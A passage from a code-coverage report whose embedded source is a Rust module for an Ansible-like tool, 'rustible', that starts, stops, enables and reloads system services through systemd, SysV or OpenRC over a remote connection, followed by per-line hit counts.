address":[24844052,24844139],"length":1,"stats":{"Line":2}},{"line":323,"address":[24848253,24844282,24844456,24844540],"length":1,"stats":{"Line":2}},{"line":324,"address":[24844508,24844433],"length":1,"stats":{"Line":1}},{"line":325,"address":[24844573,24848251],"length":1,"stats":{"Line":1}},{"line":330,"address":[24844758],"length":1,"stats":{"Line":1}},{"line":331,"address":[24844837,24844920],"length":1,"stats":{"Line":2}},{"line":335,"address":[24844986,24845377],"length":1,"stats":{"Line":2}},{"line":337,"address":[24845574,24845725],"length":1,"stats":{"Line":2}},{"line":338,"address":[24845842,24847001,24846917,24848230],"length":1,"stats":{"Line":2}},{"line":339,"address":[25781222,25781286],"length":1,"stats":{"Line":0}},{"line":341,"address":[24847205,24847122],"length":1,"stats":{"Line":2}},{"line":343,"address":[24847237],"length":1,"stats":{"Line":1}},{"line":348,"address":[24847304],"length":1,"stats":{"Line":1}},{"line":349,"address":[24847422],"length":1,"stats":{"Line":1}},{"line":350,"address":[25782496,25782256],"length":1,"stats":{"Line":1}},{"line":351,"address":[25782278,25782342],"length":1,"stats":{"Line":0}},{"line":353,"address":[25782800,25783190,25783196],"length":1,"stats":{"Line":1}},{"line":354,"address":[25782956],"length":1,"stats":{"Line":0}},{"line":356,"address":[25782864,25782932],"length":1,"stats":{"Line":0}},{"line":360,"address":[24848029,24847938],"length":1,"stats":{"Line":2}},{"line":366,"address":[24845871,24846001,24846896,24846085],"length":1,"stats":{"Line":2}},{"line":367,"address":[25781888,25781910],"length":1,"stats":{"Line":1}},{"line":368,"address":[24846891,24846127],"length":1,"stats":{"Line":1}},{"line":370,"address":[24845091],"length":1,"stats":{"Line":0}},{"line":372,"address":[24845028,24844955],"length":1,"stats":{"Line":0}},{"line":376,"address":[25780928,25781168],"length":1,"stats":{"Line":1}},{"line":377,"address":[25780950,25781014],"length":1,"stats":{"Line":0}},{"line":382,"address":[24846558],"length":1,"stats":{"Line":1}},{"line":385,"address":[24846667,24846596],"length":1,"stats":{"Line":2}},{"line":428,"address":[24846775],"length":1,"stats":{"Line":1}},{"line":432,"address":[24848384],"length":1,"stats":{"Line":0}},{"line":440,"address":[25783411,25783582,25783658,25785532],"length":1,"stats":{"Line":0}},{"line":441,"address":[25783539,25786585,25786560],"length":1,"stats":{"Line":0}},{"line":447,"address":[25783885,25785507,25783762],"length":1,"stats":{"Line":0}},{"line":449,"address":[25784556],"length":1,"stats":{"Line":0}},{"line":458,"address":[25784443,25784939],"length":1,"stats":{"Line":0}},{"line":460,"address":[25785789,25785982,25785394,25785906,25785457],"length":1,"stats":{"Line":0}},{"line":461,"address":[25785218,25785398,25785321],"length":1,"stats":{"Line":0}},{"line":462,"address":[25785853,25785625,25783468,25785479,25785422],"length":1,"stats":{"Line":0}},{"line":463,"address":[25786752,25785883,25786987],"length":1,"stats":{"Line":0}},{"line":464,"address":[25786834,25786774],"length":1,"stats":{"Line":0}},{"line":468,"address":[25786151],"length":1,"stats":{"Line":0}},{"line":472,"address":[24834017,24831856,24833780],"length":1,"stats":{"Line":1}},{"line":477,"address":[24831912],"length":1,"stats":{"Line":1}},{"line":480,"address":[24831978],"length":1,"stats":{"Line":1}},{"line":481,"address":[24832012],"length":1,"stats":{"Line":1}},{"line":482,"address":[24832023],"length":1,"stats":{"Line":1}},{"line":483,"address":[24832080],"length":1,"stats":{"Line":0}},{"line":487,"address":[24832106,24832330],"length":1,"stats":{"Line":1}},{"line":489,"address":[25779659,25780435],"length":1,"stats":{"Line":0}},{"line":490,"address":[25779742,25780154],"length":1,"stats":{"Line":0}},{"line":494,"address":[25780101,25779766],"length":1,"stats":{"Line":0}},{"line":497,"address":[25779831,25779673],"length":1,"stats":{"Line":0}},{"line":505,"address":[24832423],"length":1,"stats":{"Line":1}},{"line":506,"address":[24833831],"length":1,"stats":{"Line":1}},{"line":507,"address":[24832508],"length":1,"stats":{"Line":1}},{"line":511,"address":[24832433],"length":1,"stats":{"Line":1}},{"line":513,"address":[24832473],"length":1,"stats":{"Line":1}},{"line":515,"address":[24832777,24832622],"length":1,"stats":{"Line":2}},{"line":516,"address":[24832671,24832769],"length":1,"stats":{"Line":2}},{"line":518,"address":[24832648,24832678],"length":1,"stats":{"Line":0}},{"line":522,"address":[24832820,24833737,24832914,24832686],"length":1,"stats":{"Line":3}},{"line":524,"address":[24833039,24833651,24833241],"length":1,"stats":{"Line":0}},{"line":525,"address":[24833446,24833617],"length":1,"stats":{"Line":0}},{"line":529,"address":[24833078],"length":1,"stats":{"Line":1}},{"line":534,"address":[24826743,24826749,24826464],"length":1,"stats":{"Line":0}},{"line":536,"address":[24826521],"length":1,"stats":{"Line":0}},{"line":537,"address":[24826566,24826634],"length":1,"stats":{"Line":0}}],"covered":80,"coverable":173},{"path":["/","home","artur","Repositories","rustible","src","modules","service.rs"],"content":"//! Service module - Service management\n//!\n//! This module manages system services using systemd (or other init systems).\n//! It supports both local and remote execution via the connection interface.\n\nuse super::{\n    Diff, Module, ModuleClassification, ModuleContext, ModuleError, ModuleOutput, ModuleParams,\n    ModuleResult, ParamExt,\n};\nuse crate::connection::{CommandResult, Connection, ExecuteOptions};\nuse std::sync::Arc;\n\n/// Supported init systems\n#[derive(Debug, Clone, PartialEq)]\npub enum InitSystem {\n    Systemd,\n    SysV,\n    Upstart,\n    OpenRC,\n    Launchd,\n}\n\nimpl InitSystem {\n    /// Detect the init system on a target via connection\n    async fn detect_async(connection: \u0026dyn Connection) -\u003e Option\u003cSelf\u003e {\n        // Check for systemd first (most common)\n        let result = connection\n            .execute(\"test -d /run/systemd/system \u0026\u0026 echo yes || echo no\", None)\n            .await;\n        if let Ok(result) = result {\n            if result.stdout.trim() == \"yes\" {\n                return Some(InitSystem::Systemd);\n            }\n        }\n\n        // Check for systemctl\n        let result = connection\n            .execute(\n                \"which systemctl \u003e/dev/null 2\u003e\u00261 \u0026\u0026 echo yes || echo no\",\n                None,\n            )\n            .await;\n        if let Ok(result) = result {\n            if result.stdout.trim() == \"yes\" {\n                return Some(InitSystem::Systemd);\n            }\n        }\n\n        // Check for OpenRC\n        let result = connection\n            .execute(\n                \"which rc-service \u003e/dev/null 2\u003e\u00261 \u0026\u0026 echo yes || echo no\",\n                None,\n            )\n            .await;\n        if let Ok(result) = result {\n            if result.stdout.trim() == \"yes\" {\n                return Some(InitSystem::OpenRC);\n            }\n        }\n\n        // Check for launchctl (macOS)\n        let result = connection\n            .execute(\n                \"which launchctl \u003e/dev/null 2\u003e\u00261 \u0026\u0026 echo yes || echo no\",\n                None,\n            )\n            .await;\n        if let Ok(result) = result {\n            if result.stdout.trim() == \"yes\" {\n                return Some(InitSystem::Launchd);\n            }\n        }\n\n        // Check for SysV init scripts\n        let result = connection\n            .execute(\"test -d /etc/init.d \u0026\u0026 echo yes || echo no\", None)\n            .await;\n        if let Ok(result) = result {\n            if result.stdout.trim() == \"yes\" {\n                return Some(InitSystem::SysV);\n            }\n        }\n\n        None\n    }\n}\n\n/// Desired state for a service\n#[derive(Debug, Clone, PartialEq)]\npub enum ServiceState {\n    Started,\n    Stopped,\n    Restarted,\n    Reloaded,\n}\n\nimpl ServiceState {\n    fn from_str(s: \u0026str) -\u003e ModuleResult\u003cSelf\u003e {\n        match s.to_lowercase().as_str() {\n            \"started\" | \"running\" =\u003e Ok(ServiceState::Started),\n            \"stopped\" =\u003e Ok(ServiceState::Stopped),\n            \"restarted\" =\u003e Ok(ServiceState::Restarted),\n            \"reloaded\" =\u003e Ok(ServiceState::Reloaded),\n            _ =\u003e Err(ModuleError::InvalidParameter(format!(\n                \"Invalid state '{}'. Valid states: started, stopped, restarted, reloaded\",\n                s\n            ))),\n        }\n    }\n}\n\n/// Module for service management\npub struct ServiceModule;\n\nimpl ServiceModule {\n    /// Build execute options with privilege escalation if needed\n    fn build_execute_options(context: \u0026ModuleContext) -\u003e Option\u003cExecuteOptions\u003e {\n        if context.r#become {\n            Some(ExecuteOptions {\n                escalate: true,\n                escalate_user: context.become_user.clone(),\n                escalate_method: context.become_method.clone(),\n                ..Default::default()\n            })\n        } else {\n            None\n        }\n    }\n\n    /// Execute a command via connection\n    async fn execute_command(\n        connection: \u0026dyn Connection,\n        command: \u0026str,\n        context: \u0026ModuleContext,\n    ) -\u003e ModuleResult\u003cCommandResult\u003e {\n        let options = Self::build_execute_options(context);\n        connection\n            .execute(command, options)\n            .await\n            .map_err(|e| ModuleError::ExecutionFailed(format!(\"Connection execute failed: {}\", e)))\n    }\n\n    /// Check if service is active (systemd)\n    async fn systemd_is_active(\n        connection: \u0026dyn Connection,\n        service: \u0026str,\n        context: \u0026ModuleContext,\n    ) -\u003e ModuleResult\u003cbool\u003e {\n        let cmd = format!(\"systemctl is-active {}\", service);\n        let result = Self::execute_command(connection, \u0026cmd, context).await?;\n        Ok(result.success)\n    }\n\n    /// Check if service is enabled (systemd)\n    async fn systemd_is_enabled(\n        connection: \u0026dyn Connection,\n        service: \u0026str,\n        context: \u0026ModuleContext,\n    ) -\u003e ModuleResult\u003cbool\u003e {\n        let cmd = format!(\"systemctl is-enabled {}\", service);\n        let result = Self::execute_command(connection, \u0026cmd, context).await?;\n        Ok(result.success)\n    }\n\n    /// Execute a systemd action\n    async fn systemd_action(\n        connection: \u0026dyn Connection,\n        service: \u0026str,\n        action: \u0026str,\n        context: \u0026ModuleContext,\n    ) -\u003e ModuleResult\u003c(bool, String, String)\u003e {\n        let cmd = format!(\"systemctl {} {}\", action, service);\n        let result = Self::execute_command(connection, \u0026cmd, context).await?;\n        Ok((result.success, result.stdout, result.stderr))\n    }\n\n    /// Reload systemd daemon\n    async fn systemd_daemon_reload(\n        connection: \u0026dyn Connection,\n        context: \u0026ModuleContext,\n    ) -\u003e ModuleResult\u003c()\u003e {\n        let result = Self::execute_command(connection, \"systemctl daemon-reload\", context).await?;\n        if result.success {\n            Ok(())\n        } else {\n            Err(ModuleError::ExecutionFailed(result.stderr))\n        }\n    }\n\n    /// Check if service is active (SysV)\n    async fn sysv_is_active(\n        connection: \u0026dyn Connection,\n        service: \u0026str,\n        context: \u0026ModuleContext,\n    ) -\u003e ModuleResult\u003cbool\u003e {\n        let cmd = format!(\"service {} status\", service);\n        let result = Self::execute_command(connection, \u0026cmd, context).await?;\n        Ok(result.success)\n    }\n\n    /// Execute a SysV action\n    async fn sysv_action(\n        connection: \u0026dyn Connection,\n        service: \u0026str,\n        action: \u0026str,\n        context: \u0026ModuleContext,\n    ) -\u003e ModuleResult\u003c(bool, String, String)\u003e {\n        let cmd = format!(\"service {} {}\", service, action);\n        let result = Self::execute_command(connection, \u0026cmd, context).await?;\n        Ok((result.success, result.stdout, result.stderr))\n    }\n\n    /// Check if service is active (OpenRC)\n    async fn openrc_is_active(\n        connection: \u0026dyn Connection,\n        service: \u0026str,\n        context: \u0026ModuleContext,\n    ) -\u003e ModuleResult\u003cbool\u003e {\n        let cmd = format!(\"rc-service {} status\", service);\n        let result = Self::execute_command(connection, \u0026cmd, context).await?;\n        Ok(result.success)\n    }\n\n    /// Execute an OpenRC action\n    async fn openrc_action(\n        connection: \u0026dyn Connection,\n        service: \u0026str,\n        action: \u0026str,\n        context: \u0026ModuleContext,\n    ) -\u003e ModuleResult\u003c(bool, String, String)\u003e {\n        let cmd = format!(\"rc-service {} {}\", service, action);\n        let result = Self::execute_command(connection, \u0026cmd, context).await?;\n        Ok((result.success, result.stdout, result.stderr))\n    }\n\n    /// Check if service is active for any init system\n    async fn is_active(\n        connection: \u0026dyn Connection,\n        init: \u0026InitSystem,\n        service: \u0026str,\n        context: \u0026ModuleContext,\n    ) -\u003e ModuleResult\u003cbool\u003e {\n        match init {\n            InitSystem::Systemd =\u003e Self::systemd_is_active(connection, service, context).await,\n            InitSystem::SysV =\u003e Self::sysv_is_active(connection, service, context).await,\n            InitSystem::OpenRC =\u003e Self::openrc_is_active(connection, service, context).await,\n            _ =\u003e Err(ModuleError::Unsupported(format!(\n                \"Init system {:?} not fully supported yet\",\n                init\n            ))),\n        }\n    }\n\n    /// Execute a service action for any init system\n    async fn service_action(\n        connection: \u0026dyn Connection,\n        init: \u0026InitSystem,\n        service: \u0026str,\n        action: \u0026str,\n        context: \u0026ModuleContext,\n    ) -\u003e ModuleResult\u003c(bool, String, String)\u003e {\n        match init {\n            InitSystem::Systemd =\u003e Self::systemd_action(connection, service, action, context).await,\n            InitSystem::SysV =\u003e Self::sysv_action(connection, service, action, context).await,\n            InitSystem::OpenRC =\u003e Self::openrc_action(connection, service, action, context).await,\n            _ =\u003e Err(ModuleError::Unsupported(format!(\n                \"Init system {:?} not fully supported yet\",\n                init\n            ))),\n        }\n    }\n\n    /// Execute the service module with async connection\n    async fn execute_async(\n        \u0026self,\n        params: \u0026ModuleParams,\n        context: \u0026ModuleContext,\n        connection: Arc\u003cdyn Connection + Send + Sync\u003e,\n    ) -\u003e ModuleResult\u003cModuleOutput\u003e {\n        let service = params.get_string_required(\"name\")?;\n        let state = params.get_string(\"state\")?;\n        let enabled = params.get_bool(\"enabled\")?;\n        let daemon_reload = params.get_bool_or(\"daemon_reload\", false);\n\n        let init = InitSystem::detect_async(connection.as_ref())\n            .await\n            .ok_or_else(|| {\n                ModuleError::ExecutionFailed(\"Could not detect init system\".to_string())\n            })?;\n\n        let mut changed = false;\n        let mut messages = Vec::new();\n\n        // Handle daemon-reload for systemd\n        if daemon_reload \u0026\u0026 init == InitSystem::Systemd {\n            if context.check_mode {\n                messages.push(\"Would reload systemd daemon\".to_string());\n            } else {\n                Self::systemd_daemon_reload(connection.as_ref(), context).await?;\n                messages.push(\"Reloaded systemd daemon\".to_string());\n                changed = true;\n            }\n        }\n\n        // Handle enabled state\n        if let Some(should_enable) = enabled {\n            if init == InitSystem::Systemd {\n                let is_enabled =\n                    Self::systemd_is_enabled(connection.as_ref(), \u0026service, context).await?;\n\n                if should_enable != is_enabled {\n                    if context.check_mode {\n                        let action = if should_enable { \"enable\" } else { \"disable\" };\n                        messages.push(format!(\"Would {} service '{}'\", action, service));\n                        changed = true;\n                    } else {\n                        let action = if should_enable { \"enable\" } else { \"disable\" };\n                        let (success, _, stderr) =\n                            Self::systemd_action(connection.as_ref(), \u0026service, action, context)\n                                .await?;\n\n                        if !success {\n                            return Err(ModuleError::ExecutionFailed(format!(\n                                \"Failed to {} service '{}': {}\",\n                                action, service, stderr\n                            )));\n                        }\n\n                        messages.push(format!(\"{}d service '{}'\", action, service));\n                        changed = true;\n                    }\n                }\n            }\n        }\n\n        // Handle state\n        if let Some(state_str) = state {\n            let desired_state = ServiceState::from_str(\u0026state_str)?;\n            let is_active = Self::is_active(connection.as_ref(), \u0026init, \u0026service, context).await?;\n\n            match desired_state {\n                ServiceState::Started =\u003e {\n                    if !is_active {\n                        if context.check_mode {\n                            messages.push(format!(\"Would start service '{}'\", service));\n                            changed = true;\n                        } else {\n                            let (success, _, stderr) = Self::service_action(\n                                connection.as_ref(),\n                                \u0026init,\n                                \u0026service,\n                                \"start\",\n                                context,\n                            )\n                            .await?;\n\n                            if !success {\n                                return Err(ModuleError::ExecutionFailed(format!(\n                                    \"Failed to start service '{}': {}\",\n                                    service, stderr\n                                )));\n                            }\n\n                            messages.push(format!(\"Started service '{}'\", service));\n                            changed = true;\n                        }\n                    } else {\n                        messages.push(format!(\"Service '{}' is already running\", service));\n                    }\n                }\n\n                ServiceState::Stopped =\u003e {\n                    if is_active {\n                        if context.check_mode {\n                            messages.push(format!(\"Would stop service '{}'\", service));\n                            changed = true;\n                        } else {\n                            let (success, _, stderr) = Self::service_action(\n                                connection.as_ref(),\n                                \u0026init,\n                                \u0026service,\n                                \"stop\",\n                                context,\n                            )\n                            .await?;\n\n                            if !success {\n                                return Err(ModuleError::ExecutionFailed(format!(\n                                    \"Failed to stop service '{}': {}\",\n                                    service, stderr\n                                )));\n                            }\n\n                            messages.push(format!(\"Stopped service '{}'\", service));\n                            changed = true;\n                        }\n                    } else {\n                        messages.push(format!(\"Service '{}' is already stopped\", service));\n                    }\n                }\n\n                ServiceState::Restarted =\u003e {\n                    if context.check_mode {\n                        messages.push(format!(\"Would restart service '{}'\", service));\n                        changed = true;\n                    } else {\n                        let (success, _, stderr) = Self::service_action(\n                            connection.as_ref(),\n                            \u0026init,\n                            \u0026service,\n                            \"restart\",\n                            context,\n                        )\n                        .await?;\n\n                        if !success {\n                            return Err(ModuleError::ExecutionFailed(format!(\n                                \"Failed to restart service '{}': {}\",\n                                service, stderr\n                            )));\n                        }\n\n                        messages.push(format!(\"Restarted service '{}'\", service));\n                        changed = true;\n                    }\n                }\n\n                ServiceState::Reloaded =\u003e {\n                    if context.check_mode {\n                        messages.push(format!(\"Would reload service '{}'\", service));\n                        changed = true;\n                    } else {\n                        let (success, _, stderr) = Self::service_action(\n                            connection.as_ref(),\n                            \u0026init,\n                            \u0026service,\n                            \"reload\",\n                            context,\n                        )\n                        .await?;\n\n                        if !success {\n                            // Try reload-or-restart as fallback for systemd\n                            if init == InitSystem::Systemd {\n                                let (success2, _, stderr2) = Self::systemd_action(\n                                    connection.as_ref(),\n                                    \u0026service,\n                                    \"reload-or-restart\",\n                                    context,\n                                )\n                                .await?;\n                                if !success2 {\n                                    return Err(ModuleError::ExecutionFailed(format!(\n                                        \"Failed to reload service '{}': {}\",\n                                        service, stderr2\n                                    )));\n                                }\n                            } else {\n                                return Err(ModuleError::ExecutionFailed(format!(\n                                    \"Failed to reload service '{}': {}\",\n                                    service, stderr\n                                )));\n                            }\n                        }\n\n                        messages.push(format!(\"Reloaded service '{}'\", service));\n                        changed = true;\n                    }\n                }\n            }\n        }\n\n        let msg = if messages.is_empty() {\n            format!(\"Service '{}' is in desired state\", service)\n        } else {\n            messages.join(\". \")\n        };\n\n        // Get current status for output\n        let status = if init == InitSystem::Systemd {\n            let is_active = Self::systemd_is_active(connection.as_ref(), \u0026service, context)\n                .await\n                .unwrap_or(false);\n            let is_enabled = Self::systemd_is_enabled(connection.as_ref(), \u0026service, context)\n                .await\n                .unwrap_or(false);\n            serde_json::json!({\n                \"active\": is_active,\n                \"enabled\": is_enabled\n            })\n        } else {\n            let is_active = Self::is_active(connection.as_ref(), \u0026init, \u0026service, context)\n                .await\n                .unwrap_or(false);\n            serde_json::json!({\n                \"active\": is_active\n            })\n        };\n\n        if changed {\n            Ok(ModuleOutput::changed(msg).with_data(\"status\", status))\n        } else {\n            Ok(ModuleOutput::ok(msg).with_data(\"status\", status))\n        }\n    }\n\n    /// Execute diff with async connection\n    async fn diff_async(\n        \u0026self,\n        params: \u0026ModuleParams,\n        context: \u0026ModuleContext,\n        connection: Arc\u003cdyn Connection + Send + Sync\u003e,\n    ) -\u003e ModuleResult\u003cOption\u003cDiff\u003e\u003e {\n        let service = params.get_string_required(\"name\")?;\n        let state = params.get_string(\"state\")?;\n        let enabled = params.get_bool(\"enabled\")?;\n\n        let init = match InitSystem::detect_async(connection.as_ref()).await {\n            Some(i) =\u003e i,\n            None =\u003e return Ok(None),\n        };\n\n        let is_active = Self::is_active(connection.as_ref(), \u0026init, \u0026service, context)\n            .await\n            .unwrap_or(false);\n        let is_enabled = if init == InitSystem::Systemd {\n            Self::systemd_is_enabled(connection.as_ref(), \u0026service, context)\n                .await\n                .unwrap_or(false)\n        } else {\n            false\n        };\n\n        let mut before_lines = Vec::new();\n        let mut after_lines = Vec::new();\n\n        before_lines.push(format!(\"active: {}\", if is_active { \"yes\" } else { \"no\" }));\n\n        if let Some(state_str) = state {\n            let desired_state = ServiceState::from_str(\u0026state_str)?;\n            let will_be_active = match desired_state {\n                ServiceState::Started =\u003e true,\n                ServiceState::Stopped =\u003e false,\n                ServiceState::Restarted | ServiceState::Reloaded =\u003e is_active,\n            };\n            after_lines.push(format!(\n                \"active: {}\",\n                if will_be_active { \"yes\" } else { \"no\" }\n            ));\n        } else {\n            after_lines.push(format!(\"active: {}\", if is_active { \"yes\" } else { \"no\" }));\n        }\n\n        if init == InitSystem::Systemd {\n            before_lines.push(format!(\n                \"enabled: {}\",\n                if is_enabled { \"yes\" } else { \"no\" }\n            ));\n\n            if let Some(should_enable) = enabled {\n                after_lines.push(format!(\n                    \"enabled: {}\",\n                    if should_enable { \"yes\" } else { \"no\" }\n                ));\n            } else {\n                after_lines.push(format!(\n                    \"enabled: {}\",\n                    if is_enabled { \"yes\" } else { \"no\" }\n                ));\n            }\n        }\n\n        let before = before_lines.join(\"\\n\");\n        let after = after_lines.join(\"\\n\");\n\n        if before == after {\n            Ok(None)\n        } else {\n            Ok(Some(Diff::new(before, after)))\n        }\n    }\n}\n\nimpl Module for ServiceModule {\n    fn name(\u0026self) -\u003e \u0026'static str {\n        \"service\"\n    }\n\n    fn description(\u0026self) -\u003e \u0026'static str {\n        \"Manage system services\"\n    }\n\n    fn classification(\u0026self) -\u003e ModuleClassification {\n        ModuleClassification::RemoteCommand\n    }\n\n    fn required_params(\u0026self) -\u003e \u0026[\u0026'static str] {\n        \u0026[\"name\"]\n    }\n\n    fn execute(\n        \u0026self,\n        params: \u0026ModuleParams,\n        context: \u0026ModuleContext,\n    ) -\u003e ModuleResult\u003cModuleOutput\u003e {\n        // Get connection from context\n        let connection = context.connection.clone().ok_or_else(|| {\n            ModuleError::ExecutionFailed(\n                \"No connection available for service module execution\".to_string(),\n            )\n        })?;\n\n        // Use tokio runtime to execute async code\n        let handle = tokio::runtime::Handle::try_current()\n            .map_err(|_| ModuleError::ExecutionFailed(\"No tokio runtime available\".to_string()))?;\n\n        handle.block_on(self.execute_async(params, context, connection))\n    }\n\n    fn check(\u0026self, params: \u0026ModuleParams, context: \u0026ModuleContext) -\u003e ModuleResult\u003cModuleOutput\u003e {\n        let check_context = ModuleContext {\n            check_mode: true,\n            ..context.clone()\n        };\n        self.execute(params, \u0026check_context)\n    }\n\n    fn diff(\u0026self, params: \u0026ModuleParams, context: \u0026ModuleContext) -\u003e ModuleResult\u003cOption\u003cDiff\u003e\u003e {\n        // Get connection from context\n        let connection = match context.connection.clone() {\n            Some(c) =\u003e c,\n            None =\u003e return Ok(None),\n        };\n\n        // Use tokio runtime to execute async code\n        let handle = match tokio::runtime::Handle::try_current() {\n            Ok(h) =\u003e h,\n            Err(_) =\u003e return Ok(None),\n        };\n\n        handle.block_on(self.diff_async(params, context, connection))\n    }\n}\n\n#[cfg(test)]\nmod tests {\n    use super::*;\n\n    #[test]\n    fn test_service_state_from_str() {\n        assert_eq!(\n            ServiceState::from_str(\"started\").unwrap(),\n            ServiceState::Started\n        );\n        assert_eq!(\n            ServiceState::from_str(\"running\").unwrap(),\n            ServiceState::Started\n        );\n        assert_eq!(\n            ServiceState::from_str(\"stopped\").unwrap(),\n            ServiceState::Stopped\n        );\n        assert_eq!(\n            ServiceState::from_str(\"restarted\").unwrap(),\n            ServiceState::Restarted\n        );\n        assert_eq!(\n            ServiceState::from_str(\"reloaded\").unwrap(),\n            ServiceState::Reloaded\n        );\n        assert!(ServiceState::from_str(\"invalid\").is_err());\n    }\n\n    #[test]\n    fn test_service_module_metadata() {\n        let module = ServiceModule;\n        assert_eq!(module.name(), \"service\");\n        assert_eq!(module.classification(), ModuleClassification::RemoteCommand);\n        assert_eq!(module.required_params(), \u0026[\"name\"]);\n    }\n\n    // Integration tests would require actual services and a connection\n}\n","traces":[{"line":25,"address":[31115655,31115854,31116688,31115676,31115705,31115439,31115634,31115613,31115408,31115570],"length":1,"stats":{"Line":0}},{"line":27,"address":[31116041,31115810,31115523,31115503],"length":1,"stats":{"Line":0}},{"line":28,"address":[31115511,31115527],"length":1,"stats":{"Line":0}},{"line":29,"address":[25958356],"length":1,"stats":{"Line":0}},{"line":30,"address":[31116291,31116175],"length":1,"stats":{"Line":0}},{"line":31,"address":[31116347,31116426],"length":1,"stats":{"Line":0}},{"line":32,"address":[31116545],"length":1,"stats":{"Line":0}},{"line":37,"address":[31116962,31116216,31116236,31116757],"length":1,"stats":{"Line":0}},{"line":40,"address":[31116224],"length":1,"stats":{"Line":0}},{"line":42,"address":[25958375],"length":1,"stats":{"Line":0}},{"line":43,"address":[31117099,31117215],"length":1,"stats":{"Line":0}},{"line":44,"address":[31117353,31117274],"length":1,"stats":{"Line":0}},{"line":45,"address":[31117472],"length":1,"stats":{"Line":0}},{"line":50,"address":[31117160,31117883,31117140,31117678],"length":1,"stats":{"Line":0}},{"line":53,"address":[31117148],"length":1,"stats":{"Line":0}},{"line":55,"address":[25958397],"length":1,"stats":{"Line":0}},{"line":56,"address":[31118148,31118029],"length":1,"stats":{"Line":0}},{"line":57,"address":[31118216,31118295],"length":1,"stats":{"Line":0}},{"line":58,"address":[31118414],"length":1,"stats":{"Line":0}},{"line":63,"address":[31118073,31118093,31118825,31118626],"length":1,"stats":{"Line":0}},{"line":66,"address":[31118081],"length":1,"stats":{"Line":0}},{"line":68,"address":[31118675,31118949,31115663,31118579,31118648],"length":1,"stats":{"Line":0}},{"line":69,"address":[31119084,31118971],"length":1,"stats":{"Line":0}},{"line":70,"address":[31119219,31119152],"length":1,"stats":{"Line":0}},{"line":71,"address":[31119320],"length":1,"stats":{"Line":0}},{"line":76,"address":[31119514,31119035,31119713,31119015],"length":1,"stats":{"Line":0}},{"line":77,"address":[31119023,31119039],"length":1,"stats":{"Line":0}},{"line":78,"address":[31115684,31119841,31119479,31119563,31119536],"length":1,"stats":{"Line":0}},{"line":79,"address":[31119855,31119946],"length":1,"stats":{"Line":0}},{"line":80,"address":[31120018,31120085],"length":1,"stats":{"Line":0}},{"line":81,"address":[31120186],"length":1,"stats":{"Line":0}},{"line":85,"address":[31119892],"length":1,"stats":{"Line":0}},{"line":99,"address":[23903456,23904182,23904176],"length":1,"stats":{"Line":1}},{"line":100,"address":[23903483,23903585],"length":1,"stats":{"Line":2}},{"line":101,"address":[23903601],"length":1,"stats":{"Line":1}},{"line":102,"address":[23903714,23903785],"length":1,"stats":{"Line":2}},{"line":103,"address":[23903855,23903757,23903811],"length":1,"stats":{"Line":3}},{"line":104,"address":[23903924,23903827,23903881],"length":1,"stats":{"Line":3}},{"line":105,"address":[23903892,23903946],"length":1,"stats":{"Line":2}},{"line":118,"address":[23905595,23905072,23905589],"length":1,"stats":{"Line":0}},{"line":119,"address":[23905102,23905123],"length":1,"stats":{"Line":0}},{"line":120,"address":[23905298],"length":1,"stats":{"Line":0}},{"line":122,"address":[23905130],"length":1,"stats":{"Line":0}},{"line":123,"address":[23905164],"length":1,"stats":{"Line":0}},{"line":124,"address":[23905245],"length":1,"stats":{"Line":0}},{"line":127,"address":[23905116],"length":1,"stats":{"Line":0}},{"line":132,"address":[23904816],"length":1,"stats":{"Line":0}},{"line":137,"address":[31153548],"length":1,"stats":{"Line":0}},{"line":138,"address":[31153656,31153922,31153721],"length":1,"stats":{"Line":0}},{"line":139,"address":[31153665],"length":1,"stats":{"Line":0}},{"line":140,"address":[25974868],"length":1,"stats":{"Line":0}},{"line":141,"address":[31154013,31154080,31154102],"length":1,"stats":{"Line":0}},{"line":145,"address":[23904944],"length":1,"stats":{"Line":0}},{"line":150,"address":[31155700,31155811],"length":1,"stats":{"Line":0}},{"line":151,"address":[25979159],"length":1,"stats":{"Line":0}},{"line":152,"address":[31156585],"length":1,"stats":{"Line":0}},{"line":156,"address":[23905008],"length":1,"stats":{"Line":0}},{"line":161,"address":[31156916,31157027],"length":1,"stats":{"Line":0}},{"line":162,"address":[31157121,31156970,31157220,31157328],"length":1,"stats":{"Line":0}},{"line":163,"address":[31157801],"length":1,"stats":{"Line":0}},{"line":167,"address":[23904656],"length":1,"stats":{"Line":0}},{"line":173,"address":[31150992,31151116],"length":1,"stats":{"Line":0}},{"line":174,"address":[31151459,31151054,31151350,31151251],"length":1,"stats":{"Line":0}},{"line":175,"address":[31151874],"length":1,"stats":{"Line":0}},{"line":179,"address":[23905616],"length":1,"stats":{"Line":0}},{"line":183,"address":[25990036],"length":1,"stats":{"Line":0}},{"line":184,"address":[31158891,31158703],"length":1,"stats":{"Line":0}},{"line":185,"address":[31158893],"length":1,"stats":{"Line":0}},{"line":187,"address":[31158714],"length":1,"stats":{"Line":0}},{"line":192,"address":[23904752],"length":1,"stats":{"Line":0}},{"line":197,"address":[31152324,31152435],"length":1,"stats":{"Line":0}},{"line":198,"address":[25971991],"length":1,"stats":{"Line":0}},{"line":199,"address":[31153209],"length":1,"stats":{"Line":0}},{"line":203,"address":[23904272],"length":1,"stats":{"Line":0}},{"line":209,"address":[31126860,31126736],"length":1,"stats":{"Line":0}},{"line":210,"address":[25963911],"length":1,"stats":{"Line":0}},{"line":211,"address":[31127618],"length":1,"stats":{"Line":0}},{"line":215,"address":[23904880],"length":1,"stats":{"Line":0}},{"line":220,"address":[31154484,31154595],"length":1,"stats":{"Line":0}},{"line":221,"address":[25976407],"length":1,"stats":{"Line":0}},{"line":222,"address":[31155369],"length":1,"stats":{"Line":0}},{"line":226,"address":[23904448],"length":1,"stats":{"Line":0}},{"line":232,"address":[31147568,31147692],"length":1,"stats":{"Line":0}},{"line":233,"address":[31147926,31148035,31147630,31147827],"length":1,"stats":{"Line":0}},{"line":234,"address":[31148450],"length":1,"stats":{"Line":0}},{"line":238,"address":[23905664],"length":1,"stats":{"Line":0}},{"line":244,"address":[31159285],"length":1,"stats":{"Line":0}},{"line":245,"address":[25959327],"length":1,"stats":{"Line":0}},{"line":246,"address":[31159385,31159704,31160403,31159517],"length":1,"stats":{"Line":0}},{"line":247,"address":[25959357],"length":1,"stats":{"Line":0}},{"line":248,"address":[31159415,31159836],"length":1,"stats":{"Line":0}},{"line":256,"address":[23904544],"length":1,"stats":{"Line":0}},{"line":263,"address":[31148963],"length":1,"stats":{"Line":0}},{"line":264,"address":[25971647],"length":1,"stats":{"Line":0}},{"line":265,"address":[25971662],"length":1,"stats":{"Line":0}},{"line":266,"address":[31149096,31149540,31149304,3115051